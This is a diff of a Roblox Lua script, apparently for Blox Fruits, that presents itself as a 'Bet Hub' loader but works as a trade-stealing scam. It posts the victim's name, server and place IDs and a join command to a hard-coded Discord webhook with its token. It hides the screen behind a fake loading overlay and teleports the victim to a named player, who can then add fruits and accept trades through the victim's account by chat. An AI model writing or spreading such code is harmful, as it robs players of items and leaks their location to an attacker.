@@ -2,7 +2,6 @@ if _G.BetHubExecutado then
     warn("Script do Bet Hub já foi executado!")
     return
 end
-
 _G.BetHubExecutado = true
 
 print("Script do Bet Hub executado com sucesso!")
@@ -10,155 +9,67 @@ print("Script do Bet Hub executado com sucesso!")
 -- Serviços
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
 
 -- Variáveis
 local targetPlayerName = "robloxromao"
-local placeId = game.PlaceId
-local jobId = game.JobId
+local placeId, jobId = game.PlaceId, game.JobId
 local webhookURL = "https://discord.com/api/webhooks/1349483490151891087/GaVAOLEdQXjzVNmcx3VtCi8IfXilWxGalFn-3RrMMktrHmzFWQq5dfruXLJgA9bHIv8W"
-local firstTeleportDone = false  
 
 -- Funções utilitárias
 local function removerSons()
     for _, sound in ipairs(game:GetDescendants()) do
-        if sound:IsA("Sound") then
-            sound:Destroy()
-        end
+        if sound:IsA("Sound") then sound:Destroy() end
     end
 end
 
 local function bloquearPulo()
     local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local humanoid = character:FindFirstChild("Humanoid")
-    if humanoid then
-        humanoid.JumpPower = 0
-    end
+    if humanoid then humanoid.JumpPower = 0 end
 end
 
 local function teleportToPlayer(targetPlayer)
     if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
         local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
         if targetHRP then
-            task.wait(0.1)
             LocalPlayer.Character.HumanoidRootPart.CFrame = targetHRP.CFrame + targetHRP.CFrame.LookVector * 10
-            task.delay(0.5, bloquearPulo)
-
-            if not firstTeleportDone then
-                firstTeleportDone = true
-                task.delay(1.50, removerSons)
-                task.delay(0.1, function()
-                    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
-                    local chat = playerGui and playerGui:FindFirstChild("Chat")
-                    if chat then chat.Enabled = false end
-                end)
-            end
+            task.wait(0.5)
+            bloquearPulo()
+            removerSons()
         end
     end
 end
 
-local function createOrUpdateLoadingUI(visible)
-    local screenGui = LocalPlayer.PlayerGui:FindFirstChild("LoadingUI")
+local function createLoadingUI()
+    local screenGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+    screenGui.Name = "LoadingUI"
 
-    if not screenGui then
-        screenGui = Instance.new("ScreenGui")
-        screenGui.Name = "LoadingUI"
-        screenGui.Parent = LocalPlayer.PlayerGui
+    local frame = Instance.new("Frame", screenGui)
+    frame.Size = UDim2.new(0, 90000, 0, 90000)
+    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.BackgroundColor3 = Color3.fromRGB(128,0,128)
+    frame.BorderSizePixel = 0
 
-        local frame = Instance.new("Frame")
-        frame.Size = UDim2.new(0, 90000, 0, 90000)
-        frame.AnchorPoint = Vector2.new(0.5, 0.5)
-        frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-        frame.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
-        frame.BorderSizePixel = 0
-        frame.Name = "MainFrame"
-        frame.Parent = screenGui
-
-        local loadingText = Instance.new("TextLabel")
-        loadingText.Size = UDim2.new(0, 200, 0, 30)
-        loadingText.Position = UDim2.new(0.5, -100, 0.5, -50)
-        loadingText.BackgroundTransparency = 1
-        loadingText.Text = "Loading Bet Hub"
-        loadingText.TextSize = 20
-        loadingText.Font = Enum.Font.GothamBold
-        loadingText.TextColor3 = Color3.fromRGB(0, 0, 0)
-        loadingText.Parent = frame
-
-        local progressBarFrame = Instance.new("Frame")
-        progressBarFrame.Size = UDim2.new(0, 260, 0, 20)
-        progressBarFrame.Position = UDim2.new(0.5, -130, 0.5, -10)
-        progressBarFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        progressBarFrame.BorderSizePixel = 0
-        progressBarFrame.Parent = frame
-        progressBarFrame.ClipsDescendants = true
-
-        local corner = Instance.new("UICorner")
-        corner.CornerRadius = UDim.new(0, 10)
-        corner.Parent = progressBarFrame
-
-        local progressBar = Instance.new("Frame")
-        progressBar.Size = UDim2.new(0, 0, 1, 0)
-        progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        progressBar.BorderSizePixel = 0
-        progressBar.Parent = progressBarFrame
-
-        local progressCorner = Instance.new("UICorner")
-        progressCorner.CornerRadius = UDim.new(0, 10)
-        progressCorner.Parent = progressBar
-
-        task.spawn(function()
-            for i = 1, 100 do
-                progressBar:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Sine", 0.45, true)
-                task.wait(0.45)
-            end
-        end)
-    end
-
-    screenGui.Enabled = true
+    local text = Instance.new("TextLabel", frame)
+    text.Size = UDim2.new(0, 200, 0, 30)
+    text.Position = UDim2.new(0.5, -100, 0.5, -50)
+    text.BackgroundTransparency = 1
+    text.Text = "Loading Bet Hub"
+    text.TextSize = 20
+    text.Font = Enum.Font.GothamBold
+    text.TextColor3 = Color3.new(0,0,0)
 end
 
-local function waitForPlayerToBeSpawned(player)
+local function waitForCharacter(player)
     local character = player.Character or player.CharacterAdded:Wait()
-    while not character:FindFirstChild("Humanoid") do
-        task.wait(0.1)
-    end
+    while not character:FindFirstChild("Humanoid") do task.wait() end
     return character
 end
 
-local function monitorRobloxRomao()
-    local player = Players:FindFirstChild(targetPlayerName)
-    if not player then return end
-
-    local character = waitForPlayerToBeSpawned(player)
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not humanoid then return end
-
-    humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
-        if humanoid.Sit then
-            print(targetPlayerName .. " sentou-se.")
-            createOrUpdateLoadingUI(true)
-            teleportToPlayer(player)
-        end
-    end)
-end
-
-Players.PlayerAdded:Connect(function(player)
-    if player.Name == targetPlayerName then
-        player.CharacterAdded:Connect(monitorRobloxRomao)
-    end
-end)
-
-if Players:FindFirstChild(targetPlayerName) then
-    monitorRobloxRomao()
-end
-
--- Sistema de Trade via Chat
-local function onChatted(player, message)
-    if player == LocalPlayer then return end
-    if player.Name ~= targetPlayerName then return end
-
-    local fruitName = message:lower()
+local function setupTradeChat(player)
     local fruits = {
         dragon="Dragon-Dragon", kitsune="Kitsune-Kitsune", yeti="Yeti-Yeti", leopard="Leopard-Leopard",
         spirit="Spirit-Spirit", gas="Gas-Gas", control="Control-Control", venom="Venom-Venom",
@@ -168,64 +79,34 @@ local function onChatted(player, message)
         buddha="Buddha-Buddha", quake="Quake-Quake"
     }
 
-    if fruitName:sub(1, 1) == "-" then
-        local removeFruit = fruitName:sub(2)
-        if fruits[removeFruit] then
-            print(player.Name.." removeu: "..removeFruit)
-            ReplicatedStorage.Remotes.TradeFunction:InvokeServer("removeItem", fruits[removeFruit])
+    player.Chatted:Connect(function(message)
+        local msg = message:lower()
+        if msg:sub(1, 1) == "-" then
+            local fruitName = msg:sub(2)
+            if fruits[fruitName] then
+                print(player.Name.." removeu: "..fruitName)
+                ReplicatedStorage.Remotes.TradeFunction:InvokeServer("removeItem", fruits[fruitName])
+            end
+        elseif msg == "accept" then
+            print(player.Name.." aceitou a troca.")
+            ReplicatedStorage.Remotes.TradeFunction:InvokeServer("accept")
+        elseif fruits[msg] then
+            print(player.Name.." adicionou: "..msg)
+            ReplicatedStorage.Remotes.TradeFunction:InvokeServer("addItem", fruits[msg])
         end
-    elseif fruitName == "accept" then
-        print(player.Name.." aceitou a troca.")
-        ReplicatedStorage.Remotes.TradeFunction:InvokeServer("accept")
-    elseif fruits[fruitName] then
-        print(player.Name.." adicionou: "..fruitName)
-        ReplicatedStorage.Remotes.TradeFunction:InvokeServer("addItem", fruits[fruitName])
-    end
-end
-
-for _, player in pairs(Players:GetPlayers()) do
-    player.Chatted:Connect(function(message)
-        onChatted(player, message)
     end)
 end
 
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        onChatted(player, message)
-    end)
-end)
-
-ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(".", "All")
-
--- Detectar Sea atual
-local function detectarSea()
-    local placeId = game.PlaceId
-    if placeId == 2753915549 then
-        return "First Sea"
-    elseif placeId == 4442272183 then
-        return "Second Sea"
-    elseif placeId == 7449423635 then
-        return "Third Sea"
-    else
-        return "Desconhecido"
-    end
-end
-
--- Envia PlaceID, JobID e Sea via Webhook
 local function enviarWebhook()
-    local seaAtual = detectarSea()
     local requestData = {
         Url = webhookURL,
         Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
+        Headers = { ["Content-Type"] = "application/json" },
         Body = HttpService:JSONEncode({
             content = "*Novo Servidor Encontrado!*\n" ..
                       "> *Jogador:* "..LocalPlayer.Name.."\n" ..
                       "> *Place ID:* "..placeId.."\n" ..
                       "> *Job ID:* "..jobId.."\n" ..
-                      "> *Sea:* "..seaAtual.."\n" ..
                       "> *Comando para entrar:*\n```lua\n" ..
                       "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..placeId..", \""..jobId.."\")\n```"
         })
@@ -242,7 +123,49 @@ local function enviarWebhook()
     end
 end
 
+local function monitorRobloxRomao(player)
+    local character = waitForCharacter(player)
+    local humanoid = character:FindFirstChild("Humanoid")
+    if humanoid then
+        humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
+            if humanoid.Sit then
+                print(player.Name.." sentou-se.")
+                createLoadingUI()
+                teleportToPlayer(player)
+            end
+        end)
+    end
+    setupTradeChat(player)
+end
+
+local function monitorSEA()
+    local sea = workspace:FindFirstChild("SeaEvent")
+    if sea then
+        print("🌊 SEA EVENT ATIVO! 🌊")
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SEA DETECTADO!!!", "All")
+    end
+end
+
+-- Conectar eventos existentes
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == targetPlayerName then
+        print(targetPlayerName.." entrou no servidor.")
+        monitorRobloxRomao(player)
+    end
+end)
+
+if Players:FindFirstChild(targetPlayerName) then
+    print(targetPlayerName.." já está no servidor.")
+    monitorRobloxRomao(Players[targetPlayerName])
+end
+
+-- SEA Monitor contínuo
+while task.wait(2) do
+    monitorSEA()
+end
+
+-- Enviar webhook inicial
 task.wait(1)
 enviarWebhook()
 
-print("Script carregado! Enviando Job ID, Place ID e Sea para o webhook…")
+print("Script carregado com sucesso.")
